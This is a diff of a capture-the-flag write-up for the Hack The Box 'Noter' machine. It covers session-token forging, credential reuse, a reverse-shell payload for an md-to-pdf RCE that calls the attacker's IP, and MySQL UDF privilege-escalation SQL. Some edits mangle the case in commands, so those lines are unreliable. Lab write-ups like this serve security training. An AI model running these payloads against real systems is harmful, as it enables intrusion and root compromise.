@@ -1,6 +1,5 @@
 
 
-
 # Noter Machine
 <p align="center">
 <img src="./img/box.png" allign="center" alt="Logo">
@@ -22,14 +21,14 @@ I started as always by scanning the machine ports :
 
 * FTP on 21.
 
-* A webserver on port 5000.
+* A web server on port 5000.
 
 
-I tried anonymous login on ftp but that didn't work. So i decided to look at the web server on port 5000. It was a flask web app that provides users with a database to store and manage notes.
+I tried anonymous login on FTP but that didn't work. So i decided to look at the web server on port 5000. It was a flask web app that provides users with a database to store and manage notes.
 
 <img src="./img/2.png">
 
-Trying common logins and passwords (admin:admin, *:*, root:root ...) or trigering an SQL error wasn't fruitful.
+Trying common logins and passwords (admin:admin, *:*, root:root ...) or triggering an SQL error wasn't fruitful.
 So i decided to register a user Tom to be able to further explore the app.
 
 <img src="./img/3.png">
@@ -40,7 +39,7 @@ I decoded it with jwt.io which revealed an awkward payload and an interesting he
 
 <img src="./img/4.png">
 
-It wasn't actually a typical jwt which often looked more like this (with a valid signature):
+It wasn't a typical jwt which often looked more like this (with a valid signature):
 
 <img src="./img/5.png">
 
@@ -59,19 +58,19 @@ I used ffuf using my generated tokens as a session value and there was 2 200 HTT
 
 <img src="./img/8.png">
 
-A username "user" which was useless and another one named "blue" which actually had some stored notes.
+A username "user" which was useless and another one named "blue" which had some stored notes.
 
-One note written by ftp_admin exposed the ftp username and password of blue.
+One note written by ftp_admin exposed the FTP username and password of blue.
 
 <img src="./img/9.png">
 
-I used these creds to access ftp on port 21. It had an empty directory and a pdf file which exposed the comapany's password policy.
-Reading only the title, i thought i only had some additional specifications making password guessing easier, but it actually specified the way default passwords are generated.
+I used these creds to access FTP on port 21. It had an empty directory and a pdf file that exposed the company's password policy.
+Reading only the title, i thought i only had some additional specifications making password guessing easier, but it specified the way default passwords are generated.
 
 <img src="./img/11.png">
 
-I tried to ftp using user:user@Noter! but it failed it made me think that it was just an account created by another HTB player.(i was so desperate that i tried root:root@Noter! too)
-But there was a potential username which i didn't used yet, so i decided to give it a shot.
+I tried to FTP using user:user@Noter! but it failed it made me think that it was just an account created by another HTB player. (i was so desperate that i tried root:root@Noter! too)
+But there was a potential username that i didn't use yet, so i decided to give it a shot.
 ftp_admin:ftp_admin@Noter! was the one.
 
 <img src="./img/12.png">
@@ -89,7 +88,7 @@ Through the templates folder, i discovered hidden paths import_note and export_n
 
 <img src="./img/15.png">
 
-It's backend code was in md_to_pdf.js. And Google proved again that it's my best friend, revealing an RCE vulnerability:
+Its backend code was in md_to_pdf.js. And Google proved again that it's my best friend, revealing an RCE vulnerability:
 
 <img src="./img/16.png">
 
@@ -99,23 +98,23 @@ The only proof of concept i found was a local one :
 
 But in my case i hosted a markdown file (.md) with a reverse shell payload:
 
-``` ---js\n((require("child_process")).execSync("bash -i >& /dev/tcp/10.10.14.43/4444 0>&1"))\n--- ```
+``` ---js\n((require("child_process")).execSync("bash -i >& /dev/TCP/10.10.14.43/4444 0>&1"))\n--- ```
 
-I prepared my listener and requested my malicious md file (http://10.10.14.43:80/a.md) from th vulnerable server to trigger the rce but it didn't work, i didn't catch a shell. 
+I prepared my listener and requested my malicious MD file (http://10.10.14.43:80/a.md) from the vulnerable server to trigger the rce but it didn't work, i didn't catch a shell. 
 
 <img src="./img/18.png">
 
-I had this problem before and i thought i had a trick to fix it which was wrapping the revshell in bash -c ''.
+I had this problem before and i thought i had a trick to fix it which was wrapping the rev shell in bash -c ''.
 It was better but i still didn't get an interactive shell.
 
 <img src="./img/19.png">
 
-Looking again at the public proof of concept i had an idea of seperating the shell and the rce payload.
+Looking again at the public proof of concept i had an idea of separating the shell and the rce payload.
 And successfully got a shell.
 
 <img src="./img/20.png">
 
-Running linpeas revealed an open mysql port and i already have the root creds.
+Running linpeas revealed an open MySQL port and i already have the root creds.
 After some searching i found this Privilege Escalation with MySQL User Defined Functions:
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library
 <img src="./img/22.png">
@@ -123,10 +122,10 @@ https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privile
 I downloaded the library compiled it and made a text file containing the payload to copy the root flag to /tmp and make it readable.
 
 ``` 
-use mysql;
+use MySQL;
 create table foo(line blob);
 insert into foo values(load_file('/tmp/raptor_udf2.so'));
-select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
+select * from foo into dumpfile '/usr/lib/x86_64-Linux-gnu/mariadb19/plugin/raptor_udf2.so';
 create function do_system returns integer soname 'raptor_udf2.so';
 select do_system('cp /root/root.txt /tmp; chown svc svc /tmp/root.txt;');
  ```
